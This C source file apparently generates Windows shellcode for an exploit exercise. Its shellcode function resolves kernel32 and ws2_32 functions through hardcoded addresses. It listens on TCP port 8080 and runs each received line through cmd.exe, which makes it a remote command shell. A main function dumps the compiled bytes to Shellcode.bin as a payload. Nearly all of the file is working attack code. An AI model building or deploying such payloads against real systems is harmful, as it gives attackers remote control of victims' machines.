
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <iphlpapi.h>
#include <Windows.h>
#include <intrin.h>


void my_memset(void* buf, size_t bytes);
void my_strcat(char* s, char* t);


void ShellcodeEntry()
{
	HMODULE (*_GetModuleHandleA)(LPCSTR) = 0x62501B48;
	FARPROC (*_GetProcAddress)(HMODULE, LPCSTR) = 0x62501B40;

	void* (* __cdecl _malloc)(size_t) = 0x62501AD8;
	void (* __cdecl _free)(void*) = 0x62501AE8;

	char cstrKernel32dll[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
	HMODULE hKernel32dll = _GetModuleHandleA(cstrKernel32dll);


	char cstrExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
	void (*f_ExitProcess)(UINT) = _GetProcAddress(hKernel32dll, cstrExitProcess);

	char cstrCreateProcessA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0' };
	BOOL (*f_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)
		= _GetProcAddress(hKernel32dll, cstrCreateProcessA);
	if (f_CreateProcessA == NULL)
	{
		f_ExitProcess(1);
	}

	char cstrLoadLobraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A','\0' };
	HMODULE(*f_LoadLibraryA)(LPCSTR) = _GetProcAddress(hKernel32dll, cstrLoadLobraryA);
	if (f_LoadLibraryA == NULL)
	{
		f_ExitProcess(2);
	}



	char cstrws232dll[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' };
	HMODULE hws232dll = f_LoadLibraryA(cstrws232dll);
	if (hws232dll == NULL)
	{
		f_ExitProcess(3);
	}

	char cstrWSAStartup[] = {'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', '\0'};
	int(*f_WSAStartup)(WORD, LPWSADATA) = _GetProcAddress(hws232dll, cstrWSAStartup);
	if (f_WSAStartup == NULL)
	{
		f_ExitProcess(4);
	}

	char cstrSocket[] = { 's','o','c','k','e','t','\0' };
	int (*f_Socket)(int, int, int) = _GetProcAddress(hws232dll, cstrSocket);
	if (f_Socket == NULL)
	{
		f_ExitProcess(5);
	}

	char cstrWSAGetLastError[] = { 'W', 'S', 'A', 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', '\0' };
	int(*f_WSAGetLastError)() = _GetProcAddress(hws232dll, cstrWSAGetLastError);
	if (f_WSAGetLastError == NULL)
	{
		f_ExitProcess(6);
	}

	char cstrInetAddr[] = {'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', '\0' };
	unsigned long(*f_InetAddr)(const char*) = _GetProcAddress(hws232dll, cstrInetAddr);
	if (f_InetAddr == NULL)
	{
		f_ExitProcess(7);
	}

	char cstrHtons[] = { 'h', 't', 'o', 'n', 's', '\0' };
	u_short(*f_Htons)(u_short) = _GetProcAddress(hws232dll, cstrHtons);
	if (f_Htons == NULL)
	{
		f_ExitProcess(8);
	}

	char cstrBind[] = { 'b', 'i', 'n', 'd','\0' };
	int(*f_Bind)(SOCKET, const struct sockaddr*, int) = _GetProcAddress(hws232dll, cstrBind);
	if (f_Bind == NULL)
	{
		f_ExitProcess(9);
	}

	char cstrListen[] = { 'l', 'i', 's', 't', 'e', 'n','\0' };
	int(*f_Listen)(SOCKET, int) = _GetProcAddress(hws232dll, cstrListen);
	if (f_Listen == NULL)
	{
		f_ExitProcess(10);
	}

	char cstrAccept[] = { 'a', 'c', 'c', 'e', 'p', 't', '\0' };
	SOCKET(*f_Accept)(SOCKET, struct sockaddr* , int*) = _GetProcAddress(hws232dll, cstrAccept);
	if (f_Accept == NULL)
	{
		f_ExitProcess(11);
	}

	char cstrRecv[] = { 'r','e', 'c', 'v', '\0' };
	int(*f_Recv)(SOCKET, char*, int, int) = _GetProcAddress(hws232dll, cstrRecv);
	if (f_Recv == NULL)
	{
		f_ExitProcess(12);
	}

	char cstrSend[] = { 's','e', 'n', 'd', '\0' };
	int(*f_Send)(SOCKET, const char*, int, int) = _GetProcAddress(hws232dll, cstrSend);
	if (f_Send == NULL)
	{
		f_ExitProcess(13);
	}


	char myInetAddr[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', '\0' };
	char Ok[] = { 'o', 'k', '\n', '\0' };
	char cmd[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', ' ', '/', 'k', ' ', '\0' };
	char linebreak[] = { '\n', '\0' };

	// Дальше код TCP 

	WSADATA wsaData;
	int iResult = f_WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		f_ExitProcess(50);
	}
	
	SOCKET ListenSocket;
	ListenSocket = f_Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ListenSocket == INVALID_SOCKET) {
		f_ExitProcess(51);
	}

	struct sockaddr_in service;
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = f_InetAddr(myInetAddr);
	service.sin_port = f_Htons(8080);

	if (f_Bind(ListenSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR){
		f_ExitProcess(52);
	}

	if (f_Listen(ListenSocket, 1) == SOCKET_ERROR){
		f_ExitProcess(53);
	}

	SOCKET AcceptSocket;
	AcceptSocket = f_Accept(ListenSocket, NULL, NULL);
	if (AcceptSocket == INVALID_SOCKET){
		f_ExitProcess(54);
	}


	char* recvbuf = (char*)_malloc(512 * sizeof(char));
	char* recvcommands = (char*)_malloc(512 * sizeof(char));
	char* cmdcommand = (char*)_malloc(1024 * sizeof(char));

	int iSendResult, len = 0;
	int recvbuflen = 512;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	do 
	{
		do
		{
			iResult = f_Recv(AcceptSocket, recvbuf, recvbuflen, 0);
			recvcommands[len] = recvbuf[0];
			len++;
		} while (recvbuf[1] != linebreak[0]);

		recvcommands[len - 1] = 0;
		cmdcommand[0] = 0;

		iSendResult = f_Send(AcceptSocket, Ok, 3, 0);

		my_memset(&si, sizeof(si));
		si.cb = sizeof(si);
		my_memset(&pi, sizeof(pi));

		my_strcat(cmdcommand, cmd);
		my_strcat(cmdcommand, recvcommands);

		if (!f_CreateProcessA(0, cmdcommand, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			f_ExitProcess(500);


		recvcommands[0] = 0;
		len = 0;
		recvbuf[1] = 0;
	} while (iResult > 0);

	f_ExitProcess(1000);
}


void my_memset(void* buf, size_t bytes)
{
	if (buf)
	{
		char* tmp_mem = (char*)buf;
		while (bytes--) *tmp_mem++ = 0;
	}
}

void my_strcat(char* s, char* t) 
{
	while (*s++);
	s--;
	while (*s++ = *t++);
}

void END_SHELLCODE(void) {}

int main()
{
	FILE* fShellcode = fopen("Shellcode.bin", "wb");
	fwrite(ShellcodeEntry, sizeof(char), ((char*)END_SHELLCODE - (char*)ShellcodeEntry), fShellcode);
	fclose(fShellcode);

	printf("\nShellcode size = %u", (char*)END_SHELLCODE - (char*)ShellcodeEntry);

	return 0;
}